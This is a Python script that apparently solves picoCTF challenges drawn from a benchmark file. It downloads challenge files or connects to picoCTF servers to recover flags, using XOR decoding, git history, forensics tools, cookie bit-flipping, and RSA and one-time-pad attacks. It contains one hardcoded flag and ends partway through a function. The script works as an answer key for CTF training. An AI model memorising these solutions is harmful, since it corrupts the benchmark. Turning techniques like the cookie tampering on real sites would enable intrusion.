import codecs
import hashlib
import json
import os
import re
import shutil
import subprocess
import tempfile
import zipfile
import time
import struct
import decimal
import fitz
import requests
import gmpy2
import pytesseract
import itsdangerous
import flask
import urllib3
import urllib.parse as urlparse
import base64 as b64
from ast import literal_eval
from PIL import Image, ImageFile, ImageFilter
from pwn import *
from typing import Tuple, Iterator, Iterable, Optional

urllib3.disable_warnings()
ImageFile.LOAD_TRUNCATED_IMAGES = True

with open("benchmark.json", "r") as file:
	benchmark = json.load(file)


def fixme1py():
	def str_xor(secret, key):
		new_key = key
		i = 0
		while len(new_key) < len(secret):
			new_key = new_key + key[i]
			i = (i + 1) % len(key)
		return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])

	url = benchmark["fixme1.py"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		file_content = response.text

		lines = file_content.split('\n')

		for line in lines:
			if "flag_enc =" in line:
				flag_enc = eval(line.split("=")[-1].strip())
				return str_xor(flag_enc, "enkidu")
	else:
		print(f"Failed to download the file. ({url})")


def fixme2py():
	def str_xor(secret, key):
		new_key = key
		i = 0
		while len(new_key) < len(secret):
			new_key = new_key + key[i]
			i = (i + 1) % len(key)
		return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])

	url = benchmark["fixme2.py"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		file_content = response.text

		lines = file_content.split('\n')

		for line in lines:
			if "flag_enc =" in line:
				flag_enc = eval(line.split("=")[-1].strip())
				return str_xor(flag_enc, "enkidu")
	else:
		print(f"Failed to download the file. ({url})")


def mod26():
	pattern = r'.{7}\{.*?\}'
	secret = re.findall(pattern, benchmark["Mod 26"]["description"])[0]
	return subprocess.run(f'echo "{secret}" | tr a-zA-Z n-za-mN-ZA-M', shell=True, capture_output=True).stdout.decode().strip()


def rotation():
	def rotate_char(c, k):
		if 'a' <= c <= 'z':
			return chr((ord(c) - ord('a') - k) % 26 + ord('a'))
		elif 'A' <= c <= 'Z':
			return chr((ord(c) - ord('A') - k) % 26 + ord('A'))
		else:
			return c

	url = benchmark["rotation"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		file_content = response.text.strip()

		for k in range(1, 26):
			decrypted_content = ''.join(rotate_char(c, k) for c in file_content)
			if "picoCTF{" in decrypted_content:
				return decrypted_content
	else:
		print(f"Failed to download the file. ({url})")


def interencdec():
	def rotate_char(c, k):
		if 'a' <= c <= 'z':
			return chr((ord(c) - ord('a') - k) % 26 + ord('a'))
		elif 'A' <= c <= 'Z':
			return chr((ord(c) - ord('A') - k) % 26 + ord('A'))
		else:
			return c

	url = benchmark["interencdec"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		file_content = response.text.strip()
		first_base64_decode = b64.b64decode(file_content).decode().removeprefix("b'").removesuffix("'")
		second_bas64_decode = b64.b64decode(first_base64_decode).decode()

		for k in range(1, 26):
			decrypted_content = ''.join(rotate_char(c, k) for c in second_bas64_decode)
			if "picoCTF{" in decrypted_content:
				return decrypted_content
	else:
		print(f"Failed to download the file. ({url})")


def readmycert():
	url = benchmark["ReadMyCert"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_readmycert.csr", "w") as file:
			file.write(response.text)

		command = "openssl req -in tmp_readmycert.csr -noout -text"
		output = subprocess.check_output(command.split(" ")).decode()

		os.remove("tmp_readmycert.csr")

		for line in output.split("\n"):
			if "picoCTF" in line:
				return line.split("=")[1].split(",")[0][1:]
	else:
		print(f"Failed to download the file. ({url})")


def patchmepy():
	def str_xor(secret, key):
		new_key = key
		i = 0
		while len(new_key) < len(secret):
			new_key = new_key + key[i]
			i = (i + 1) % len(key)
		return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])

	url = benchmark["patchme.py"]["files"][1]
	response = requests.get(url)

	if response.status_code == 200:
		flag_enc = response.text

		return str_xor(flag_enc, "utilitarian")
	else:
		print(f"Failed to download the file. ({url})")


def safe_opener():
	url = benchmark["Safe Opener"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		text_content = response.text

		for line in text_content.split("\n"):
			if "String encodedkey" in line and len(line.split('"')[1]) > 5:
				return f"""picoCTF{{{b64.b64decode(line.split('"')[1]).decode()}}}"""
	else:
		print(f"Failed to download the file. ({url})")


def secret_of_the_polyglot():
	def extract_pdf_from_png(png_filename, pdf_filename):
		with open(png_filename, 'rb') as file:
			data = file.read()

		png_end = data.find(b'IEND') + 8

		pdf_data = data[png_end:]

		with open(pdf_filename, 'wb') as pdf_file:
			pdf_file.write(pdf_data)

	def read_pdf_content(pdf_filename):
		doc = fitz.open(pdf_filename)
		text = ""

		for page_num in range(doc.page_count):
			page = doc.load_page(page_num)
			text += page.get_text()

		return text

	url = benchmark["Secret of the Polyglot"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_secret_of_the_polyglot.png", "wb") as file:
			file.write(response.content)
	else:
		print(f"Failed to download the file. ({url})")

	png_filename = 'tmp_secret_of_the_polyglot.png'
	pdf_filename = 'extracted_file.pdf'

	extract_pdf_from_png(png_filename, pdf_filename)
	pdf_text = read_pdf_content(pdf_filename)

	os.remove(png_filename)
	os.remove(pdf_filename)
	return f"picoCTF{{f1u3n7_{pdf_text[:-1]}"


def mob_psycho():
	url = benchmark["Mob psycho"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		temp_file_path = "tmp_mob_psycho.apk"
		with open(temp_file_path, "wb") as file:
			file.write(response.content)
	else:
		print(f"Failed to download the file. ({url})")
		return

	temp_dir = tempfile.mkdtemp()

	try:
		with zipfile.ZipFile(temp_file_path, 'r') as zip_ref:
			zip_ref.extractall(temp_dir)

		flag_content = None
		for root, dirs, files in os.walk(temp_dir):
			for file in files:
				if file == "flag.txt":
					flag_file_path = os.path.join(root, file)
					with open(flag_file_path, "r") as flag_file:
						flag_content = flag_file.read()
						break
			if flag_content is not None:
				break

		if flag_content is not None:
			flag = bytes.fromhex(flag_content).decode()
			return flag
		else:
			print("flag.txt not found.")

	finally:
		# Clean up temporary files
		os.remove(temp_file_path)
		shutil.rmtree(temp_dir)


def redaction_gone_wrong():
	def read_pdf_content(pdf_filename):
		doc = fitz.open(pdf_filename)
		text = ""

		for page_num in range(doc.page_count):
			page = doc.load_page(page_num)
			text += page.get_text()

		return text

	url = benchmark["Redaction gone wrong"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		temp_file_path = "tmp_redaction_gone_wrong.pdf"
		with open(temp_file_path, "wb") as file:
			file.write(response.content)
	else:
		print(f"Failed to download the file. ({url})")
		return

	text_content = read_pdf_content(temp_file_path)

	os.remove(temp_file_path)

	for line in "".join(text_content).split("\n"):
		if "picoCTF" in line.strip():
			return line.strip()


def c3():
	url = benchmark["C3"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		ciphertext = response.content.decode()
	else:
		print(f"Failed to download the file. ({url})")
		return

	lookup1 = "\n \"#()*+/1:=[]abcdefghijklmnopqrstuvwxyz"
	lookup2 = "ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst"

	prev = 0
	ciphertext_2=""
	for letter in ciphertext:
		ind = lookup2.index(letter)
		for x in range(100000):
			if (x - prev) % 40 == ind:
				ciphertext_2 += lookup1[x]
				prev = x
				break

	b = 1
	out = ""
	for i in range(len(ciphertext_2)):
		if i == b*b*b:
			out += ciphertext_2[i]
			b += 1
	return "picoCTF{" + out + "}"


def pw_crack_4():
	def hash_pw(pw_str):
		pw_bytes = bytearray()
		pw_bytes.extend(pw_str.encode())
		m = hashlib.md5()
		m.update(pw_bytes)
		return m.digest()

	def str_xor(secret, key):
		#extend key to secret length
		new_key = key
		i = 0
		while len(new_key) < len(secret):
			new_key = new_key + key[i]
			i = (i + 1) % len(key)
		return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])

	url_flag = benchmark["PW Crack 4"]["files"][1]
	response_flag = requests.get(url_flag)

	if response_flag.status_code == 200:
		flag_enc = response_flag.content
	else:
		print(f"Failed to download the file. ({response_flag})")
		return

	url_hash = benchmark["PW Crack 4"]["files"][2]
	response_hash = requests.get(url_hash)

	if response_hash.status_code == 200:
		correct_pw_hash = response_hash.content
	else:
		print(f"Failed to download the file. ({response_hash})")
		return

	url_script = benchmark["PW Crack 4"]["files"][0]
	response_script = requests.get(url_script)

	if response_script.status_code == 200:
		script = response_script.content.decode()
		#print(script)
		for line in script.split("\n"):
			if "pos_pw_list = [" in line:
				pos_pw_list = literal_eval(line.split("=")[1].strip())
	else:
		print(f"Failed to download the file. ({response_hash})")
		return


	for user_pw in pos_pw_list:
		user_pw_hash = hash_pw(user_pw)

		if( user_pw_hash == correct_pw_hash ):
			decryption = str_xor(flag_enc.decode(), user_pw)
			return decryption


def canyousee():
	url = benchmark["CanYouSee"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		zip_filename = "unknown.zip"
		with open(zip_filename, "wb") as file:
			file.write(response.content)

		# Unzip the file
		with zipfile.ZipFile(zip_filename, 'r') as zip_ref:
			zip_ref.extractall("extracted_files")

		# Check if the image file exists
		image_path = "extracted_files/ukn_reality.jpg"
		if not os.path.exists(image_path):
			print(f"{image_path} does not exist.")
			return

		# Read metadata using exiftool
		try:
			result = subprocess.run(["exiftool", image_path], capture_output=True, text=True)
			for line in result.stdout.strip().split("\n"):
				if "Attribution URL" in line:
					attribution_url = line.split(":")[1].strip()

		except Exception as e:
			print(f"Error reading metadata: {e}")
			return

		os.remove(image_path)
		os.removedirs("extracted_files")
		os.remove(zip_filename)

		# Extract the base64 string from the attribution URL
		try:
			base64_string = attribution_url.split(":")[-1].strip()
			decoded_string = b64.b64decode(base64_string).decode('utf-8').strip()
			return decoded_string
		except Exception as e:
			print(f"Error decoding base64 string: {e}")
			return
	else:
		print(f"Failed to download the file. ({url})")
		return


def lookey_here():
	url = benchmark["Lookey here"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		text = response.text
		pattern = r'picoCTF\{[^}]*\}'
		matches = re.findall(pattern, text)
		return matches[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def time_machine():
	url = benchmark["Time Machine"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_time_machine.zip", "wb") as file:
			file.write(content)

		with zipfile.ZipFile("tmp_time_machine.zip", 'r') as zip_ref:
			zip_ref.extractall("extracted_files")

		# Specify the path to COMMIT_EDITMSG inside drop-in/.git/
		commit_editmsg_path = os.path.join("extracted_files", "drop-in", ".git", "COMMIT_EDITMSG")

		# Read the content of COMMIT_EDITMSG
		if os.path.exists(commit_editmsg_path):
			with open(commit_editmsg_path, "r") as commit_editmsg_file:
				commit_editmsg_content = commit_editmsg_file.read()
		else:
			print(f"COMMIT_EDITMSG not found in {commit_editmsg_path}")

		# Clean up: delete the temporary zip file and extracted files
		os.remove("tmp_time_machine.zip")
		if os.path.exists("extracted_files"):
			for root, dirs, files in os.walk("extracted_files", topdown=False):
				for name in files:
					os.remove(os.path.join(root, name))
				for name in dirs:
					os.rmdir(os.path.join(root, name))
			os.rmdir("extracted_files")

		return commit_editmsg_content.strip()
	else:
		print(f"Failed to download the file. ({url})")
		return


def collaborative_development():
	url = benchmark["Collaborative Development"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_time_machine.zip", "wb") as file:
			file.write(content)

		with zipfile.ZipFile("tmp_time_machine.zip", 'r') as zip_ref:
			zip_ref.extractall("extracted_files")

		# Change directory to the drop-in folder
		drop_in_path = os.path.join("extracted_files", "drop-in")
		if os.path.isdir(drop_in_path):
			os.chdir(drop_in_path)

			# Run the series of git commands and capture the output
			output = ""
			for part in ["part-1", "part-2", "part-3"]:
				subprocess.run(["git", "checkout", f"feature/{part}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				result = subprocess.run(["cat", "flag.py"], capture_output=True, text=True)
				flag_line = [line for line in result.stdout.split("\n") if "Printing the flag" not in line and len(line) > 3][0]
				flag_part = flag_line.split('"')[1]
				output += flag_part

			os.chdir(os.path.dirname(os.path.realpath(__file__)))
			# Clean up: delete the temporary zip file and extracted files
			os.remove("tmp_time_machine.zip")
			if os.path.exists("extracted_files"):
				for root, dirs, files in os.walk("extracted_files", topdown=False):
					for name in files:
						os.remove(os.path.join(root, name))
					for name in dirs:
						os.rmdir(os.path.join(root, name))
				os.rmdir("extracted_files")
			return output.strip()
		else:
			print("drop-in folder not found in the extracted files.")
			return

	else:
		print(f"Failed to download the file. ({url})")
		return


def commitment_issues():
	url = benchmark["Commitment Issues"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_commitment_issues.zip", "wb") as file:
			file.write(content)

		# Step 2: Extract the zip file
		with zipfile.ZipFile("tmp_commitment_issues.zip", 'r') as zip_ref:
			zip_ref.extractall("extracted_files")
	else:
		print(f"Failed to download the file. ({url})")
		return

	# Change directory to the extracted folder
	os.chdir("extracted_files/drop-in")

	# Step 3: Get the git log and identify the commit ID
	log_output = subprocess.check_output(["git", "log"], text=True)
	commit_id = None

	for i in range(len(log_output.split("\n"))):
		if "flag" in log_output.split("\n")[i]:
			commit_id = log_output.split("\n")[i-4].split(" ")[-1].strip()
			break

	if commit_id is None:
		print("Commit with message 'create flag' not found.")
		return

	# Step 4: Checkout to the identified commit
	subprocess.run(["git", "checkout", commit_id], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	with open("message.txt", "r") as message_file:
		flag = message_file.read().strip()

	os.chdir("../..")
	os.remove("tmp_commitment_issues.zip")
	if os.path.exists("extracted_files"):
		for root, dirs, files in os.walk("extracted_files", topdown=False):
			for name in files:
				os.remove(os.path.join(root, name))
			for name in dirs:
				os.rmdir(os.path.join(root, name))
		os.rmdir("extracted_files")

	return flag


def repetitions():
	url = benchmark["repetitions"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		encoded_content = response.content

		while True:
			try:
				decoded_content = b64.b64decode(encoded_content)
				decoded_str = decoded_content.decode('utf-8')

				if "picoCTF" in decoded_str:
					return decoded_str.strip()

				encoded_content = decoded_content
			except Exception as e:
				print(f"Decoding error: {e}")
				break
	else:
		print(f"Failed to download the file. ({url})")
		return


def big_zip():
	url = benchmark["Big Zip"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_big_zip.zip", "wb") as file:
			file.write(content)

		# Step 2: Extract the zip file
		with zipfile.ZipFile("tmp_big_zip.zip", 'r') as zip_ref:
			zip_ref.extractall("extracted_files")

		os.chdir("extracted_files")
		result = subprocess.run(["grep", "-r", "picoCTF"], capture_output=True, text=True)
		os.chdir(os.path.dirname(os.path.realpath(__file__)))

		pattern = r'picoCTF\{[^}]*\}'
		matches = re.findall(pattern, result.stdout.strip())

		os.remove("tmp_big_zip.zip")
		if os.path.exists("extracted_files"):
			for root, dirs, files in os.walk("extracted_files", topdown=False):
				for name in files:
					os.remove(os.path.join(root, name))
				for name in dirs:
					os.rmdir(os.path.join(root, name))
			os.rmdir("extracted_files")

		return matches[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def first_find():
	url = benchmark["First Find"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_first_find.zip", "wb") as file:
			file.write(content)

		result_strings = subprocess.run(["strings", "tmp_first_find.zip"], capture_output=True, text=True)

		result = subprocess.run(["grep", "pico"], input=result_strings.stdout, capture_output=True, text=True)

		os.remove("tmp_first_find.zip")

		return result.stdout.strip()
	else:
		print(f"Failed to download the file. ({url})")
		return


def runmepy():
	url = benchmark["runme.py"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_runme.py", "wb") as file:
			file.write(content)

		result = subprocess.run(["python3", "tmp_runme.py"], capture_output=True, text=True)

		os.remove("tmp_runme.py")

		return result.stdout.strip()
	else:
		print(f"Failed to download the file. ({url})")
		return


def where_are_the_robots():
	pattern = r'https://[^ ]*/ '
	url = re.findall(pattern, benchmark["where are the robots"]["description"])[0][:-1]
	response = requests.get(url+"robots.txt")

	if response.status_code == 200:
		content = response.content
		html = content.decode().split("/")[1].split("\n")[0]
		request = requests.get(url+html)
		pattern = r'picoCTF\{[^}]*\}'
		matches = re.findall(pattern, request.text)
		return matches[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def vault_door_training():
	url = benchmark["vault-door-training"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'password\.equals\(".*?"\)'
		pw = re.findall(pattern, response.text)[0]
		return "picoCTF{"+pw.split('"')[1]+"}"
	else:
		print(f"Failed to download the file. ({url})")
		return


def vault_door_1():
	url = benchmark["vault-door-1"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		data = response.text.split("password.length() == 32 &&\n")[1].split(";\n    }")[0].replace(" ","").split("password.charAt(")
		data.pop(0)
		flag = ''.join(map(lambda x: x[1],sorted([[int(x[0]),x[1]] for i in data if(x:=i.replace("'&&\n",'').replace("'","").split(")=="))])))
		return 'picoCTF{'+flag+"}"
	else:
		print(f"Failed to download the file. ({url})")
		return


def strings_it():
	url = benchmark["strings it"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def so_meta():
	url = benchmark["So Meta"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def easy1():
	url = benchmark["Easy1"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		data = response.text.split("\n")
		data.pop(0);data.pop(0)

		table = {x[0]:x[1:] for i in data if(x:=i.replace('\n','').replace('| ','').replace(' ',''))}
		abc = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		c = "UFJKXQZQUNB"
		k = "SOLVECRYPTO"
		flag = ''.join([abc[table[i].index(c[x])] for x,i in enumerate(k)])

		return 'picoCTF{'+flag+"}"
	else:
		print(f"Failed to download the file. ({url})")
		return


def glory_of_the_garden():
	url = benchmark["Glory of the Garden"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def caesar():
	url = benchmark["caesar"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		return "picoCTF{"+subprocess.run(f'echo "{response.text.split("{")[1][:-1]}" | tr a-zA-Z e-za-dE-ZA-D', shell=True, capture_output=True).stdout.decode().strip()+"}"
	else:
		print(f"Failed to download the file. ({url})")
		return


def dont_use_client_side():
	pattern = r'https://[^ ]*/ '
	url = re.findall(pattern, benchmark["dont-use-client-side"]["description"])[0][:-1]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r', split\*(\d)\) == \'(.*?)\''
		return "pico"+''.join(map(lambda x: x[1], sorted(re.findall(pattern, response.text))))
	else:
		print(f"Failed to download the file. ({url})")
		return


def first_grep():
	url = benchmark["First Grep"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def wireshark_twoo_twooo():
	url = benchmark["Wireshark twoo twooo two twoo..."]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_shark2.pcapng", "wb") as file:
			file.write(content)

		result = subprocess.run("""tshark -nr tmp_shark2.pcapng -Y 'dns && ip.src == 192.168.38.104 && frame contains "local" && ip.dst == 18.217.1.57' | cut -d "A" -f 2 | cut -d "." -f 1 | head -n 6 | tr -d "[:space:]" | base64 -d | awk '{print $1}'""", capture_output=True, shell=True)

		os.remove("tmp_shark2.pcapng")

		return result.stdout.strip().decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def packer():
	url = benchmark["packer"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_packer", "wb") as file:
			file.write(content)

		subprocess.run(["upx", "-d", "tmp_packer"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

		result_strings = subprocess.run(["strings", "tmp_packer"], check=True, capture_output=True, text=True)

		result = subprocess.run(["grep", "flag"], input=result_strings.stdout, check=True, capture_output=True, text=True)

		flag_hex = result.stdout.split("\n")[0].split(":")[-1].strip()

		flag = codecs.decode(flag_hex, 'hex').decode('utf-8')

		os.remove("tmp_packer")

		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def disk_disk_sleuth():
	url = benchmark["Disk, disk, sleuth!"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_dds1-alpine.flag.img.gz", "wb") as file:
			file.write(content)

		subprocess.run("gzip -d tmp_dds1-alpine.flag.img.gz", capture_output=True, shell=True)
		flag = subprocess.run("grep -a picoCTF tmp_dds1-alpine.flag.img", capture_output=True, shell=True).stdout.strip().decode().split(" ")[-1]
		os.remove("tmp_dds1-alpine.flag.img")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def wireshark_doo_dooo():
	url = benchmark["Wireshark doo dooo do doo..."]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'cvpbPGS\{[^}]*\}'
		return subprocess.run(f'echo "{re.findall(pattern, response.text)[0]}" | tr a-zA-Z n-za-mN-ZA-eM', capture_output=True, shell=True).stdout.strip().decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def keygenme_py():
	return "picoCTF{1n_7h3_|<3y_of_ac73dc29}"

	url = benchmark["keygenme-py"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_keygenme_trial.py", "wb") as file:
			file.write(content.replace(choose_greatest(),decode_secret(bezos_cc_secret)))

		import tmp_keygenme_trial as tmp
		pattern = br'hashlib\.sha256\(username_trial\)\.hexdigest\(\)\[\d\]'
		dynpart = eval(b' + '.join(re.findall(pattern, content)).decode().replace("username_trial", "tmp.bUsername_trial"))
		flag = tmp.key_part_static1_trial + dynpart + tmp.key_part_static2_trial

		os.remove("tmp_keygenme_trial.py")

		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def more_cookies():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["More Cookies"]["description"])[0]
	cookie = requests.get(url).request.headers.get("Cookie").split("auth_name=")[1]
	cookieDec = bytearray(b64.b64decode(b64.b64decode(cookie)))

	for i in range(0,128):
		cook = cookieDec.copy(); cook[i//8] ^= (1<<(i%8))
		req = requests.get(url,cookies={"auth_name": b64.b64encode(b64.b64encode(cook)).decode()})
		if 'pico' in req.text:
			return 'picoCTF{'+req.text.split('picoCTF{')[1].split('}')[0]+'}'


def easy_peasy():
	pattern = r'nc mercury\.picoctf\.net (\d+)'
	PORT = re.findall(pattern, benchmark["Easy Peasy"]["description"])[0]

	# Picoctf otp implementation solver
	context.log_level = 'error'

	FQDN = 'mercury.picoctf.net'
	# PORT = 36981
	ROLLING_KEY_LEN = 50000
	FLAG_LEN = 32

	conn = remote(FQDN,PORT)
	conn.recvline(); conn.recvline()
	encFlag = bytes.fromhex(conn.recvline(keepends=False).decode("utf-8"))
	conn.recvuntil(b'ypt? ')
	conn.send(b'A'*(ROLLING_KEY_LEN-FLAG_LEN)+b'\n')
	conn.recvuntil(b'ypt? ')
	inp = b'A'*FLAG_LEN
	conn.send(inp+b'\n')
	conn.recvline()
	encKey = bytes.fromhex(conn.recvline(keepends=False).decode("utf-8"))
	key = xor(encKey,inp)
	flagnum = xor(key,encFlag).decode()
	return 'picoCTF{'+flagnum+'}'


def matryoshka_doll():
	response = requests.get(benchmark["Matryoshka doll"]["files"][0])

	if response.status_code == 200:
		with open("tmp_dolls.jpg", "wb") as file:
			file.write(response.content)

		subprocess.run(["binwalk", "tmp_dolls.jpg", "-Me"], capture_output=True)
		os.remove("tmp_dolls.jpg")
		flag = subprocess.run("cat _tmp_dolls.jpg.extracted/base_images/_2_c.jpg.extracted/base_images/_3_c.jpg.extracted/base_images/_4_c.jpg.extracted/flag.txt", shell=True, capture_output=True).stdout.strip().decode().replace("\x00", "")
		subprocess.run("rm -r _tmp_dolls.jpg.extracted", shell=True)
		return flag
	else:
		print(f"Failed to download the file. ({benchmark["Matryoshka doll"]["files"][0]})")
		return


def macrohard_weakedge():
	response = requests.get(benchmark["MacroHard WeakEdge"]["files"][0])

	if response.status_code == 200:
		os.mkdir("tmp_macrohard_weakedge"); os.chdir("tmp_macrohard_weakedge")
		with open("forensics.pptm", "wb") as file:
			file.write(response.content)

		subprocess.run(["unzip", "forensics.pptm"], capture_output=True)
		flag = subprocess.run('cat ppt/slideMasters/hidden | tr -d "[:space:]" | base64 -d', shell=True, capture_output=True).stdout.decode().split(" ")[1]
		os.chdir(".."); subprocess.run("rm -r tmp_macrohard_weakedge", shell=True)
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return

def who_are_you():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Who are you?"]["description"])[0]
	content = subprocess.run(f'curl -A PicoBrowser -H "Referer: {url}" -H "Date: Wed, 21 Oct 2018 07:28:00 GMT" -H "DNT: 1" -H "X-Forwarded-For: 88.80.28.16" -H "Accept-Language: sv-se" {url}', shell=True, capture_output=True).stdout.decode()
	pattern = r'picoCTF\{[^}]*\}'
	return re.findall(pattern, content)[0]


def cache_me_outside():
	pattern = r'nc [^ ]*? \d{3,}'
	nc = re.findall(pattern, benchmark["Cache Me Outside"]["description"])[0].split(' ')
	context.log_level = 'error'
	c = remote(nc[1],nc[2])
	c.recvline()
	c.send(b'-5144\n\x00')
	return c.recvline().decode().strip().split(" ")[-1]


def some_assembly_required_1():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Some Assembly Required 1"]["description"])[0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'src="(.*?\.js)'
		js = requests.get(url+re.findall(pattern, response.text)[0])
		pattern = r"'\./(.*?)'"
		wasm = requests.get(url+re.findall(pattern, js.text)[0])
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, wasm.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def no_padding_no_problem():
	pattern = r'nc mercury\.picoctf\.net (\d+)'
	PORT = re.findall(pattern, benchmark["No Padding, No Problem"]["description"])[0]
	context.log_level = 'error'
	FQDN = 'mercury.picoctf.net'
	# PORT = 60368

	conn = remote(FQDN,PORT)
	conn.recvuntil(b'\nn')
	n = int(conn.recvline().split(b' ')[1].strip())
	e = int(conn.recvline().split(b' ')[1].strip())
	c = int(conn.recvline().split(b' ')[1].strip())
	x = pow(2, e, n)
	conn.sendlineafter(b'to decrypt: ',str(x*c).encode())
	p = int(conn.recvline().split(b' ')[3].strip())//2
	return bytes.fromhex(hex(p)[2:]).decode()


def new_caesar():
	pattern = r'[a-z]{32,}'
	RESULT = re.findall(pattern, benchmark["New Caesar"]["description"])[0]
	ALPHABET = string.ascii_lowercase[:16]

	def b16_decode(encoded):
		orig = ''.join([chr(int("{0:04b}".format(ALPHABET.index(i))+"{0:04b}".format(ALPHABET.index(encoded[x*2+1])),2)) for x,i in enumerate(encoded[::2])])
		return orig
	backed = [''.join([ALPHABET[ALPHABET.index(l)-i] for l in RESULT]) for i in range(17)]
	decoded = [b16_decode(i) for i in backed]
	good = [i for i in decoded if all(k in string.printable and k not in '&$^/\\"' for k in i)][0]
	return "picoCTF{"+good+'}'


def dachshund_attacks():
	pattern = r'nc mercury\.picoctf\.net (\d+)'
	PORT = re.findall(pattern, benchmark["Dachshund Attacks"]["description"])[0]
	context.log_level = 'error'
	FQDN = 'mercury.picoctf.net'
	# PORT = 30761

	conn = remote(FQDN,PORT)
	conn.recvuntil(b'challenge!\n')
	e = int(conn.recvline().split(b' ')[1].strip())
	n = int(conn.recvline().split(b' ')[1].strip())
	c = int(conn.recvline().split(b' ')[1].strip())
	def isqrt(n: int) -> int:
		if n == 0:
			return 0
		x = 2 ** ((n.bit_length() + 1) // 2)
		while True:
			y = (x + n // x) // 2
			if y >= x:
				return x
			x = y

	def is_perfect_square(n: int) -> bool:
		sq_mod256 = (1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,0)
		if sq_mod256[n & 0xff] == 0:
			return False
		mt = (
			(9, (1,1,0,0,1,0,0,1,0)),
			(5, (1,1,0,0,1)),
			(7, (1,1,1,0,1,0,0)),
			(13, (1,1,0,1,1,0,0,0,0,1,1,0,1)),
			(17, (1,1,1,0,1,0,0,0,1,1,0,0,0,1,0,1,1))
